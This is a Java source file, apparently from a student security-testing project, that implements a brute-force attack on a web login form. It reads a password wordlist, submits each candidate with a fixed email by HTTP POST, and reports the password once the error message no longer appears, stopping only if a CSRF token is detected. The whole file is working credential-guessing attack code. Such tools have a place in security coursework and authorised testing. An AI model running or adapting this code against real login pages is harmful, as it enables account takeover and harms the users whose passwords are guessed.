package fr.isep.projetseculogiciel;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class BruteForceController {
    private static boolean isVulnerable = false;
    private static String message = "";

    public static void main(String[] args) {
        String url = "https://example.com/login";
        String username = "example@example.com";
        String errorMessage = "Invalid credentials";
        Result result = bruteForceAttack(url, username, errorMessage);

        // Access the results
        System.out.println("Is Vulnerable: " + result.isVulnerable);
        System.out.println("Message: " + result.message);
    }

    private static class Result {
        boolean isVulnerable;
        String message;

        Result(boolean isVulnerable, String message) {
            this.isVulnerable = isVulnerable;
            this.message = message;
        }
    }

    private static Result crack(String url, String username, String error_message, BufferedReader passwords) {
        int count = 0;
        String line;

        try {
            while ((line = passwords.readLine()) != null) {
                line = line.trim();
                count++;

                String data = "email=" + username + "&password=" + line + "&Log%20In=submit";
                byte[] postData = data.getBytes();

                HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();
                connection.setRequestMethod("POST");
                connection.setDoOutput(true);

                try (OutputStream os = connection.getOutputStream()) {
                    os.write(postData);
                }

                StringBuilder response = new StringBuilder();
                try (BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()))) {
                    String inputLine;
                    while ((inputLine = br.readLine()) != null) {
                        response.append(inputLine);
                    }
                }

                if (response.toString().contains(error_message)) {
                    isVulnerable = true;
                    // Continue the loop
                    continue;
                } else if (response.toString().contains("CSRF") || response.toString().contains("csrf")) {
                    isVulnerable = false;
                    message = "BruteForce not working on this website. CSRF Token Detected.";
                    return new Result(isVulnerable, message);
                } else {
                    isVulnerable = true;
                    message = "Password: " + line;
                    return new Result(isVulnerable, message);
                }
            }

            message = "User password not in the list of passwords";
        } catch (Exception e) {
            e.printStackTrace();
            isVulnerable = true;
            message = "Error";
        }

        return new Result(isVulnerable, message);
    }

    private static Result bruteForceAttack(String url, String username, String errorMessage) {
        try (BufferedReader passwords = new BufferedReader(new FileReader("attack_modules/brute_force/passwords.txt"))) {
            return crack(url, username, errorMessage, passwords);
        } catch (Exception e) {
            e.printStackTrace();
            return new Result(true, "Error");
        }
    }

}